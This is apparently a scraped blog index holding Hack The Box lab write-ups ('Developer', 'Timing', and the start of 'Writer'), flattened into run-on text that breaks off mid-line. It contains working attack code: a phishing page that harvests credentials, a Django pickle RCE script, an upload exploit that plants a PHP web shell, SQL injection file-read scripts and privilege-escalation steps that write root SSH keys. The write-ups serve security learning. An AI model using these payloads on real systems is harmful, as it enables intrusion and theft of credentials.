.../admin (Status: 301) [Size: 0] [--&amp;gt; /admin/]/contact (Status: 301) [Size: 0] [--&amp;gt; /contact/]/wp-admin (Status: 301) [Size: 0] [--&amp;gt; /wp-admin/]/media (Status: 301) [Size: 314] [--&amp;gt; http://developer.htb/media/]/static (Status: 301) [Size: 315] [--&amp;gt; http://developer.htb/static/]/fileadmin (Status: 301) [Size: 0] [--&amp;gt; /fileadmin/]/profile (Status: 301) [Size: 0] [--&amp;gt; /profile/]/phpmyadmin (Status: 301) [Size: 0] [--&amp;gt; /phpmyadmin/]/_admin (Status: 301) [Size: 0] [--&amp;gt; /_admin/]/siteadmin (Status: 301) [Size: 0] [--&amp;gt; /siteadmin/]/webadmin (Status: 301) [Size: 0] [--&amp;gt; /webadmin/]/dashboard (Status: 301) [Size: 0] [--&amp;gt; /dashboard/]/myadmin (Status: 301) [Size: 0] [--&amp;gt; /myadmin/]/vsadmin (Status: 301) [Size: 0] [--&amp;gt; /vsadmin/]# ... [snip] ...Any directory name which end with admin, that redirect to “Django administration” login page.Other Directories /static directory don’t have anything interesting. /contact, /profile, /dashboard redirect to /accounts/login/ /media contian bunch of png and zip file.After login, only found some ctf challengesupon completing a challenge we get a new page for submit write up.Challenges: Easy EncryptionI chosen an easy challenge from Reversing Challenges “Lucky Guess”, for other challenges or all challenges solution, 0xdf’s blogChallenge attachment contains a ELF 64-bit LSB pie executable binaryopening that binary in ghidra found a function doing xoring 2 variables and return flagDoing XOR in cyberchef and got flag: &quot;DHTB{gOInGWITHtHEfLOW}upon flag submission, got the “Walkthrough Submission” windowFootholdreverse tab-nabbingWhen we submit Walkthrough link it appear in profile page and link opens in the new tab.admin in opening link in Firefox browser❯ nc -lvnp 8081listening on [any] 8081 ...connect to [10.10.14.24] from (UNKNOWN) [10.10.11.103] 50856GET / HTTP/1.1Host: 10.10.14.24:8081User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1This is a same bug found in the hackthebox site by 0xprashant Tabnabbing is a computer exploit and phishing attack, which persuades users to submit their login details and passwords to popular websites by impersonating those sites and convincing the user that the site is genuine.So, This is a phishing attack where attacker could replace parent page if parent page implement user define urls insecurely.“When a web developer wants a link to open in a new tab, they add target=&quot;_blank&quot; to the &amp;lt;a&amp;gt; tag.&amp;lt;a id=&quot;walkthrough_link&quot; href=&quot;http://attacker&quot; target=&quot;_blank&quot;&amp;gt;Lucky Guess&amp;lt;/a&amp;gt;The issue is, if that link leads to a malicious page and mitigation aren’t in place, then JavaScript on that page(new tab page) can actually change the location of the original page(parent page). The mitigation for this is to also add rel=&quot;noopener nofollow&quot; to the &amp;lt;a&amp;gt; tag as well.”, 0xdfThe goal here will be to host a page so that when the admin clicks on the link, it open in a new tab that’s now visible. The JavaScript in that tab will reverse tab-nab the original tab to send it to another page and that page is cloned http://developer.htb/accounts/login/ page hosted on our server and when the admin is done reading my page and comes back, they’ll think they’ve been logged out for some reason, and log in again we get his creds.setup tabnap phishing pageClone login page and save it as login.htmlwget http://developer.htb/accounts/login/Create a writeup.html file and put this script.&amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script&amp;gt; if (window.opener) window.opener.parent.location.replace(&#39;http://{tun0}/accounts/login/&#39;); if (window.parent != window) window.parent.location.replace(&#39;https://{tun0}/accounts/login/&#39;); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Finally, Create a index.php file to handle requests.&amp;lt;?php$request = $_SERVER[&#39;REQUEST_URI&#39;];switch ($request) { case &#39;/accounts/login/&#39; : $method = $_SERVER[&#39;REQUEST_METHOD&#39;]; if ($method == &#39;POST&#39;){ header(&#39;Location: http://developer.htb/accounts/login/&#39;); $file = fopen(&quot;log.txt&quot;, &quot;a&quot;); foreach($_POST as $variable =&amp;gt; $value) { fwrite($file, $variable); fwrite($file, &quot;=&quot;); fwrite($file, $value); fwrite($file, &quot;\\r\\n&quot;); } fwrite($file, &quot;\\r\\n&quot;); fclose($file); exit; } elseif ($method == &#39;GET&#39;){ require __DIR__ . &#39;/login.html&#39;; break; } case &#39;/writeup&#39; : require __DIR__ . &#39;/writeup.html&#39;; break; default: http_response_code(404); break;}?&amp;gt;save all files and start php server on port 80sudo php -S {tun0}:80after everything setup, submit writeup link http://{tun0}/writeup in “Walkthrough Submission”immediately after that you could get some requests from developer.tab in your server then server creates log.txt which could contain admin creds.Now we can login to djano admin panel Admin name is: Jacobfrom new subdomain from admin panelThis subdomain is running sentry monitor for django. Sentry’s Django integration enables automatic reporting of errors and exceptions.Registering new account and login don’t give anything interesting. but login with django admin creds with email Jacob@developer.htb got admin panel in sentry.Django DeserializationAnd there’s the issue, when we create a project and then try to remove it. api through an error; full errorAnd this error leaks the django webapp secret key There is a blog post on django Remote Code Execution using api secret key from blog.scrt.chHere’s the exploit script, copied from 0xdf blogimport osimport django.contrib.sessions.serializersimport django.core.signingimport requestsimport syscmd = sys.argv[1]SECRET_KEY = &#39;c7f3a64aa184b7cbb1a7cbe9cd544913&#39;cookie = &quot;.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-hQyRXABhUpSi0uS8_OzM1PBWsrzi7JTU0KF4hNLSzLiS4tTi-KTEpOzU_NSQpUgxumVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegCrOjNK:1m45xH:Zcs2GcAl2Knls_STRUkB22PKJlg&quot;newContent = django.core.signing.loads(cookie, key=SECRET_KEY, serializer=django.contrib.sessions.serializers.PickleSerializer, salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;)class PickleRce(object): def __reduce__(self): return os.system, (cmd,)newContent[&#39;testcookie&#39;] = PickleRce()cookie = django.core.signing.dumps(newContent, key=SECRET_KEY, serializer=django.contrib.sessions.serializers.PickleSerializer, salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;, compress=True)print(&quot;Forged cookie:\\n&quot; + cookie)requests.get(&quot;http://developer-sentry.developer.htb/sentry/&quot;, cookies={&quot;sentrysid&quot;: cookie})Script only running in python2 for me, running. In python3 it give this error and i’m not a django dev or not spent too much time debug the error.django.core.exceptions.ImproperlyConfigured: Requested setting DEFAULT_HASHING_ALGORITHM, but settings are not configured. You must either define the environment variable DJANGO_SETTINGS_MODULE or call settings.configure() before accessing settings.Get reverse shellPrivescPostgresql EnumerationThere are 2 userskarl:x:1000:1000:Karl Travis:/home/karl:/bin/bashmark:x:1001:1001:,,,:/home/mark:/bin/bashThere are 2 services running so first thing is to find their config files./etc/sentry/sentry.conf.py/var/www/developer_ctf/developer_ctf/settings.pyBoth config file contains clear text passwords for Postgres database And also some local services running Postgres and Redis databases.LISTEN 0 224 127.0.0.1:5432 0.0.0.0:*LISTEN 0 511 127.0.0.1:6379 0.0.0.0:*enumerating Postgresql databases; https://book.hacktricks.xyz/pentesting/pentesting-postgresqlplatform --&amp;gt; ctf_admin:CTFOG2021sentry --&amp;gt; sentry:SentryPassword2021Some basic psql commandspsql -h localhost -d &amp;lt;database_name&amp;gt; -U &amp;lt;User&amp;gt; #Password will be prompted\\list # List databases\\c &amp;lt;database&amp;gt; # use the database\\d # List tables\\du+ # Get users roles\\q # exit from psqlSELECT * FROM auth_user;platform contains webapp users creds in auth_user table.And sentry contains system users password hashes and we already have Jacob’s password: SuperSecurePassword@HTB2021, and not useful anymore but karl password could work in sukarl:pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=For cracking these hashes with john we need to append $django$*1* in every hash, as per requirementkarl:$django$*1*pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=ssh in with karl creds: karl:insaneclownposseUser “karl” have sudo rightskarl@developer:~$ sudo -l[sudo] password for karl: Matching Defaults entries for karl on developer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser karl may run the following commands on developer: (ALL : ALL) /root/.auth/authenticatorAnd it’s ELF binary.Rust binary reversing Rust binary reversing. 0xdf writeup ippsec video" }, { "title": "Hackthebox - Timing", "url": "/posts/timing/", "categories": "hackthebox, linux", "tags": "sqli, file-upload, wgetrc, axelrc", "date": "2021-12-22 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.135 timing.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)| 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)|_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Simple WebApp|_Requested resource was ./login.phpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelGet login pageRunning ffuf found some 200 blank pages: image.php, db_conn.php❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -u &quot;http://10.10.11.135/FUZZ&quot; -e .php# ... [snip] ....htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 349ms].htpasswd.php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 351ms].htaccess.php [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 352ms].htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4709ms]css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 613ms]db_conn.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 598ms]footer.php [Status: 200, Size: 3937, Words: 1307, Lines: 116, Duration: 412ms]header.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 614ms]image.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 421ms]images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 411ms]index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 375ms]js [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 617ms]login.php [Status: 200, Size: 5609, Words: 1755, Lines: 178, Duration: 445ms]logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 614ms]profile.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 536ms]server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 298ms]upload.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 409ms]:: Progress: [40950/40950] :: Job [1/1] :: 97 req/sec :: Duration: [0:08:26] :: Errors: 0 ::FootholdLFIBy guessing that there is a /image.php it is possible that it has a parameter like img (most common) which fetch images.❯ curl -i &#39;http://10.10.11.135/image.php?img=/&#39;HTTP/1.1 200 OKDate: Sat, 18 Dec 2021 10:09:40 GMTServer: Apache/2.4.29 (Ubuntu)Content-Length: 25Content-Type: text/html; charset=UTF-8Hacking attempt detected!There are some filters but it looks like this is a blacklist based filter because some php Protocols and Wrappers are working fine. There is a one user on the box aaronAnd it’s true there is a blacklist based filtergot database creds from db_conn.php❯ curl -s &#39;http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php&#39; | base64 -d&amp;lt;?php$pdo = new PDO(&#39;mysql:host=localhost;dbname=app&#39;, &#39;root&#39;, &#39;4_V3Ry_l0000n9_p422w0rd&#39;); Creads: root:4_V3Ry_l0000n9_p422w0rdGet logged in with aaron:aaron on webapp but still nothing.Admin role impersonateThere is a one php file upload.php that still left. try to get it from aaron login session Got permission error.Using lfi to read the source code of upload.php with php Wrapper http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=&amp;lt;file&amp;gt;&amp;lt;?phpinclude(&quot;admin_auth_check.php&quot;);// ... [snip] ...upload.php only allowed for admin by checking logged in user role with admin_auth_check.php.&amp;lt;?phpinclude_once &quot;auth_check.php&quot;;if (!isset($_SESSION[&#39;role&#39;]) || $_SESSION[&#39;role&#39;] != 1) { echo &quot;No permission to access this panel!&quot;; header(&#39;Location: ./index.php&#39;); die();}?&amp;gt;Next thing to check is the profile edit page.When we update profile webapp post a request to /profile_update.phpFrom the source code of /profile_update.php there is a if statement for role parameter, if it set in the post request then update user role for current session.// ... [snip] ... if ($user !== false) { ini_set(&#39;display_errors&#39;, &#39;1&#39;); ini_set(&#39;display_startup_errors&#39;, &#39;1&#39;); error_reporting(E_ALL); $firstName = $_POST[&#39;firstName&#39;]; $lastName = $_POST[&#39;lastName&#39;]; $email = $_POST[&#39;email&#39;]; $company = $_POST[&#39;company&#39;]; $role = $user[&#39;role&#39;]; if (isset($_POST[&#39;role&#39;])) { $role = $_POST[&#39;role&#39;]; $_SESSION[&#39;role&#39;] = $role; }// ... [snip] ...With that we can update role for aaron form user to admin.We can see current role of the user is 0 and admin_auth_check.php is checking for admin role 1Now send a post request with role parameter with value 1Now request upload.php from same session cookie and there is no permission error anymore.File upload RCENow let move to next part of the upload.php file code.&amp;lt;?phpinclude(&quot;admin_auth_check.php&quot;);$upload_dir = &quot;images/uploads/&quot;;if (!file_exists($upload_dir)) { mkdir($upload_dir, 0777, true);}$file_hash = uniqid();$file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);$target_file = $upload_dir . $file_name;$error = &quot;&quot;;$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));if (isset($_POST[&quot;submit&quot;])) { $check = getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]); if ($check === false) { $error = &quot;Invalid file&quot;; }}// Check if file already existsif (file_exists($target_file)) { $error = &quot;Sorry, file already exists.&quot;;}if ($imageFileType != &quot;jpg&quot;) { $error = &quot;This extension is not allowed.&quot;;}if (empty($error)) { if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;The file has been uploaded.&quot;; } else { echo &quot;Error: There was an error uploading your file.&quot;; }} else { echo &quot;Error: &quot; . $error;}?&amp;gt;local file upload directory is images/uploads/ which we can access with lfi.$upload_dir = &quot;images/uploads/&quot;;file_name variable is MD5 hash of file_hash variable which stored a random value using uniqid() function everytime it get executed and time() function which generate a epoch time of current time and concat with _ and orignal filename but instead of using file_hash as a variable developer use it as a string &#39;$file_hash&#39; in file_name.so the final name of uploaded file looks somethings like this: MD5(&#39;$file_hash&#39; + time()) + &#39;_&#39; + somefile.jpg$file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);Then eliminating file with extension other than jpg using pathinfo() function with PATHINFO_EXTENSION to grab file extention and php document says that “PATHINFO_EXTENSION returns only the last one extension”$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));then checking imageFileType variable value for jpgif ($imageFileType != &quot;jpg&quot;) { $error = &quot;This extension is not allowed.&quot;;}But that extension part does not affect because we are going to load that file using php wrapper with lfi so we can still execute php code from a random.jpg file as long wrapper found php tag &amp;lt;?php ... ?&amp;gt; inside file.There’s only one thing left which is the MD5 hash that generate with a string &#39;$file_hash&#39; and php time() function output. time() Returns the current time measured in the number of seconds since the Unix Epoch (January 1 1970 00:00:00 GMT). that means its value changes every second. uniqid() Returns a prefixed unique identifier (13 char login random string) based on the current epoch time in microseconds level. There are 1 million possible combinations in 1 second. but we don’t need to worry about this.We can get the exact time when upload.php get executed from http response header date and convert it to epoch format and then generate MD5 hash with it. but if the uniqid() function implemented properly then this could be a pain to brute force the file name on the server because http date header does not go beyond seconds and than we have to guess that microsecond value.import requests as rfrom dateutil import parserimport calendarrspn = r.post(&quot;http://10.10.11.135/login.php&quot;)print(&#39;[+] Server time: &#39;, rspn.headers[&#39;date&#39;])dt = parser.parse(rspn.headers[&#39;date&#39;])time_epoch = calendar.timegm(dt.utctimetuple())print(&#39;[+] epoch timestamp: &#39;, time_epoch)❯ python getepoch.py[+] Server time: Tue, 21 Dec 2021 11:39:19 GMT[+] epoch timestamp: 1640086759Now, we only need to upload a jpg file and generate file name like this MD5(&#39;$file_hash&#39; + time()) + &#39;_&#39; + somefile.jpg and request it from uploaded direcotry images/uploads/ with LFI. For doing everything i create a python script.import reimport calendarimport hashlibimport tracebackimport requests as rimport jsonfrom dateutil import parserimport tempfileimport argparses = r.session()# s.proxies = {&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;}url = &quot;http://10.10.11.135&quot;arguparser = argparse.ArgumentParser(description=&#39;Run without any argument to uplaod a simple php web shell and request it with curl HTTP-POST request.&#39;)arguparser.add_argument(&quot;--cmd&quot;, help=&quot;Direct comamnd execute. Default is php web shell.&quot;)arguparser.add_argument(&quot;--file&quot;, help=&quot;Upload file form your filesystem. Default is simple php script with system function.&quot;)arguparser.add_argument(&#39;-T&#39;, action=&#39;store_true&#39;, help=&quot;Enable traceback&quot;)args = arguparser.parse_args()def becomeAdmin(): login_data = {&quot;user&quot;: &quot;aaron&quot;, &quot;password&quot;: &quot;aaron&quot;} login_rspn = s.post(f&quot;{url}/login.php?login=true&quot;, allow_redirects=True, data=login_data) check_login = re.findall(r&#39;&amp;lt;h1 class=&quot;text-center&quot; style=&quot;padding: 200px&quot;&amp;gt;(.*?)&amp;lt;/h1&amp;gt;&#39;, login_rspn.text)[0] print(&quot;[+]&quot;, check_login) role_data = {&quot;firstName&quot;: &quot;test&quot;, &quot;lastName&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test&quot;, &quot;company&quot;: &quot;test&quot;, &quot;role&quot;: &quot;1&quot;} role_rspn = s.post(f&quot;{url}/profile_update.php&quot;, data=role_data) print(&quot;[+] user role changed to: &quot;, json.loads(role_rspn.text)[&quot;role&quot;])def uploadFile(cmd=None): becomeAdmin() # Generate temporary file with pyaload f = tempfile.NamedTemporaryFile(suffix=&quot;.jpg&quot;) if args.cmd: file_content = f&quot;&quot;&quot;&amp;lt;?php system(&#39;{cmd}&#39;); ?&amp;gt;&quot;&quot;&quot;.encode(&#39;UTF-8&#39;) else: file_content = &quot;&amp;lt;?php system($_POST[&#39;cmd&#39;]); ?&amp;gt;&quot;.encode(&#39;UTF-8&#39;) f.write(file_content) f.seek(0) # print(&quot;[+] Name of the file is:&quot;, f.name.rsplit(&#39;/&#39;)[-1]) # Upload file global input_file if args.file: if args.file.lower().endswith(&#39;.jpg&#39;): input_file = args.file else: exit(&#39;[!] Only .jpg supported!&#39;) else: input_file = f.name with open(input_file, &#39;rb&#39;) as f: upload_rspn = s.post(f&quot;{url}/upload.php&quot;, files={&#39;fileToUpload&#39;: f}) print(&quot;[+]&quot;, upload_rspn.text) # Create epoch timestamp of uploaded time print(&#39;[+] Upload time: &#39;, upload_rspn.headers[&#39;date&#39;]) dt = parser.parse(upload_rspn.headers[&#39;date&#39;]) time_epoch = calendar.timegm(dt.utctimetuple()) print(&#39;[+] epoch timestamp: &#39;, time_epoch) # Create filename hash_part = &#39;$file_hash&#39; + str(time_epoch) file_name = hashlib.md5(hash_part.encode(&#39;utf-8&#39;)).hexdigest() + &quot;_&quot; + f.name.rsplit(&#39;/&#39;)[-1] f.close() print(&quot;[+] Uploaded file name:&quot;, file_name) if args.file: exit(print(&quot;[+] File location: &quot;, f&quot;{url}/image.php?img=images/uploads/{file_name}&quot;)) else: # Request uploaded file with lfi if args.cmd: check_file = s.post(f&quot;{url}/image.php?img=images/uploads/{file_name}&quot;) # php://filter/read=/resource= print(&quot;[+] Payload response -\\n&quot;, check_file.text) else: print(&quot;[+] PHP HTTP-POST web shell uploaded:&quot;, f&quot;curl \\&quot;{url}/image.php?img=images/uploads/{file_name}\\&quot; --data \\&quot;cmd=id\\&quot;&quot;) print(&quot;[+] Testing web shell -\\n&quot;, s.post(f&quot;{url}/image.php?img=images/uploads/{file_name}&quot;, data={&quot;cmd&quot;: &quot;id&quot;}).text)if __name__ == &quot;__main__&quot;: try: if args.cmd and args.file: exit(&#39;[!] Both arguments not allowed at once!&#39;) elif args.cmd: uploadFile(args.cmd) elif args.file: uploadFile() else: uploadFile() except Exception as e: if args.T: print(traceback.format_exc()) else: print(e) except KeyboardInterrupt as e: print(&#39;KeyboardInterrupt&#39;)s.close()This script directly gives command outputBut there are some issue while getting reverse shell.WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111)walking through the filesystem with web shell found a zip file in /opt directory.❯ curl &quot;http://10.10.11.135/image.php?img=images/uploads/8511adbe6698b34e753367c7f04b629a_tmple20q9e2.jpg&quot; --data &quot;cmd=ls -l /opt&quot;total 616-rw-r--r-- 1 root root 627851 Jul 20 22:36 source-files-backup.zipDownloading zip file with base64 encoding❯ curl &quot;http://10.10.11.135/image.php?img=images/uploads/8511adbe6698b34e753367c7f04b629a_tmple20q9e2.jpg&quot; --data &quot;cmd=cat /opt/source-files-backup.zip|base64 -w 0&quot; &amp;gt; source-files-backup.zip.b64 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 817k 0 817k 100 48 123k 7 0:00:06 0:00:06 --:--:-- 150k❯ cat source-files-backup.zip.b64| base64 -d &amp;gt; source-files-backup.zip❯ file source-files-backup.zipsource-files-backup.zip: Zip archive data, at least v1.0 to extract, compression method=storeZip file contains websile source code.❯ unzip -q source-files-backup.zip❯ cd backup❯ tree.├── admin_auth_check.php├── auth_check.php├── avatar_uploader.php├── css│   ├── bootstrap.min.css│   └── login.css├── db_conn.php├── footer.php├── header.php├── image.php├── images│   ├── background.jpg│   ├── uploads│   └── user-icon.png├── index.php├── js│   ├── avatar_uploader.js│   ├── bootstrap.min.js│   ├── jquery.min.js│   └── profile.js├── login.php├── logout.php├── profile.php├── profile_update.php└── upload.php4 directories, 21 filesWe already reviewed most of the code, what else we can found from this backup.There is a .git direcotry contains 2 commitsviewing second commit changes, found another passowrd NewPassword: S3cr3t_unGu3ss4bl3_p422w0RdNow this password worked in user aaron ssh login.PrivescRight off the bat, found user aaron’s sudo privilegesaaron@timing:~$ sudo -lMatching Defaults entries for aaron on timing: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser aaron may run the following commands on timing: (ALL) NOPASSWD: /usr/bin/netutilsThis is a shell script executing /root/netutils.jar. This utility allows to download file from ftp or http servers as root.aaron@timing:~$ file /usr/bin/netutils/usr/bin/netutils: Bourne-Again shell script, ASCII text executableaaron@timing:~$ cat /usr/bin/netutils#! /bin/bashjava -jar /root/netutils.jarRunning pspy while executing /usr/bin/netutils found that /root/netutils.jar is executing wget with option 1 ftp and /root/axel with option 2 http.wget and axel rc filesHere we can use both binaries to get root as they are executing as root and both have some short of same functionality that can be used for privilege escalation.Both commands have some uses of rc(run commands) file. rc suffix is commonly used for any file that contains startup information for a program. [Unix: from runcom files on the CTSS system 1962-63, via the startup script /etc/rc]Script file containing startup instructions for an application program (or an entire operating system), usually a text file containing commands of the sort that might have been invoked manually once the system was running but are to be executed automatically each time the system starts up. By default a rc file if used by a command then it is located in the user’s HOME directory who is executing that command and automatically loads on command startup. axel use .axelrc file as startup configuration file.FILES /etc/axelrc System-wide configuration file. ~/.axelrc Personal configuration file. These files are not documented in a manpage, but the example file which comes with the program contains enough information. The position of the system-wide configuration file might be different. In source code this example file is at doc/ directory. It&#39;s generally installed under /usr/share/doc/axel/examples/, or the equivalent for your system.wget use .wgetrc as a startup command file same as configuration file. More detail @gnu docs-e command--execute command Execute command as if it were a part of .wgetrc. A command thus invoked will be executed after the commands in .wgetrc, thus taking precedence over them. If you need to specify more than one wgetrc command, use multiple instances of -e. Both binaries have some level so same functionality that allows to set a default filename or default output location for downloaded files using rc file.wgetrcwget has a option output_document which allow us set default location for output file.# Set the output filename—the same as ‘-O file’.#output_document = fileWe can create .wgetrc in current user “aaron’s” $HOME folder and then normally run that /usr/bin/netutils command with option 1 and download file from our ftp server.cat &amp;lt;&amp;lt;EOF &amp;gt; .wgetrc# Set the output filename—the same as ‘-O file’.#output_document = /home/aaron/wgetrcitEOFStart python ftp serverpython3 -m pyftpdlib -p 21 -VSet default output file /home/aaron/wgetrcit and after succssfully executing command we get wgetrcit file owned by root with our content.And if we run same command again it append new content in the same file instead of create new or overwrite existing one.with that we can append a root user in /etc/passwd file or add ssh public key in root ssh directory.Lets create ssh authorized_keys in /root/.ssh and put our ssh public key.cat &amp;lt;&amp;lt;EOF &amp;gt; .wgetrc# Set the output filename—the same as ‘-O file’.#output_document = /root/.ssh/authorized_keysEOF Before running make sure that /usr/bin/netutils executing wget is recursive mode with -r.axelrcaxel has a option default_filename which work same as wget and allow us set default location for output file.# When downloading a HTTP directory/index page, (like http://localhost/~me/)# what local filename do we have to store it in?#default_filename = defaultWe can create .axelrc in current user “aaron’s” $HOME folder and then normally run that /usr/bin/netutils command with option 2.cat &amp;lt;&amp;lt;EOF &amp;gt; .axelrc# When downloading a HTTP directory/index page, (like http://localhost/~me/)# what local filename do we have to store it in?#default_filename = /home/aaron/axelrcitEOFSet default output file /home/aaron/axelrcit and after succssfully executing command we get axelrcit file owned by root with our content but where wget use wgetrc comamnd for all files, axel only uses axelrc command for HTTP directory/index page like http://url/ where url does not specifies any file suffix like /document.txt in this case axel download web servers default index.html page.But, if we run same command again axel creates new file with .0 suffix, same name file already existsWith that we have some limitations where we can not append or overwrite existing file but we can still create arbitrary file in the filesystem.i already write /root/.ssh/authorized_keys with wget let see what axel do with it.cat &amp;lt;&amp;lt;EOF &amp;gt; .axelrc# When downloading a HTTP directory/index page, (like http://localhost/~me/)# what local filename do we have to store it in?#default_filename = /root/.ssh/authorized_keysEOF Before downloading file we need to put content that we wanted to download form our web server in index.html file.And it created a new authorized_keys file with .0 and this is not gonna work but we are still able to create a arbitrary file in root directory." }, { "title": "Hackthebox - Writer", "url": "/posts/writer/", "categories": "hackthebox, linux", "tags": "sqli, sqli file read, apache wsgi, smb, ssrf, rce, postfix, invoke command with apt config, command injection", "date": "2021-12-13 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.101 writer.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)| 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)|_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Story Bank | Writer.HTB139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.2 There is a smb share but anonymous access is not allowed //10.10.11.101/writer2_project Mapping: DENIED, Listing: N/A Enum4linux found a user kyleRunning Gobuster found /administrative and /static directory./administrative have authentication bypass using sql injectionOR 1=1 -- -There are 2 places with file upload option.One in /dashboard/settingsAnd Second in /dashboard/stories/addadding a stories also have url option in place of file upload.Another directory /static which have file indexing. we can see our uploaded files in the img folder inside static directory.But looks like application is not vulnerable for file upload.There is a clint side filter http://10.10.11.101/js/form-validator.js which preventing ssrf from url in /dashboard/stories/addIt is easy to bypass with brup there’s only one catch, application is checking if url end with .jpgNothing useful back to /administrative sql injectionFootholdUNION sqli to file readFuzzing for UNION injection found after 6 columns and second column is reflected on the web page.UNION select 1,2,3,4,5,6;-- -Nothing interested in the database but database have FILE privileges And This allow us to read system file.UNION select 1,privilege_type,3,4,5,6 FROM information_schema.user_privileges;-- -Python script to simplify that process.import reimport sysimport requests as rimport base64url = &#39;http://10.10.11.101/administrative&#39;# injection = sys.argv[1] # &quot;version()&quot;injection = f&quot;TO_base64(LOAD_FILE(&#39;{sys.argv[1]}&#39;))&quot; # File Readschema = &quot;;&quot; # sys.argv[2]data = f&quot;uname=test&#39;+UNION+ALL+select+1,{injection},3,4,5,6+{schema}--+-&amp;amp;password=test&quot;header = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}rspn = r.post(url, data=data, headers=header)res = []try: res = re.findall(r&#39;&amp;lt;h3 class=&quot;animation-slide-top&quot;&amp;gt;Welcome (.*?)&amp;lt;/h3&amp;gt;&#39;, rspn.text.replace(&#39;\\n&#39;, &#39;&#39;))[0]except IndexError: print(rspn.text)else: try: print(base64.b64decode(res).decode(&#39;UTF-8&#39;)) except Exception: print(res)apache wsgiFind webapp root directory from /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/000-default.conf is a very useful file if you have access to file read on a server. There’s also a host specified in the config file which is running same application’s dev version in the localhost on port 8080.Apache server is using wsgi to host the web application. WSGI: The Web Server Gateway Interface is a simple calling convention for web servers to forward requests to web applications or frameworks written in the Python programming language.This allow users to host python web apps in a apache/nginx like servers./var/www/writer.htb/writer.wsgi is a python script that initiating python web app form __init__.py file found from the comment.python sqli.py /var/www/writer.htb/writer.wsgi#!/usr/bin/pythonimport sysimport loggingimport randomimport os# Define logginglogging.basicConfig(stream=sys.stderr)sys.path.insert(0,&quot;/var/www/writer.htb/&quot;)# Import the __init__.py from the app folderfrom writer import app as 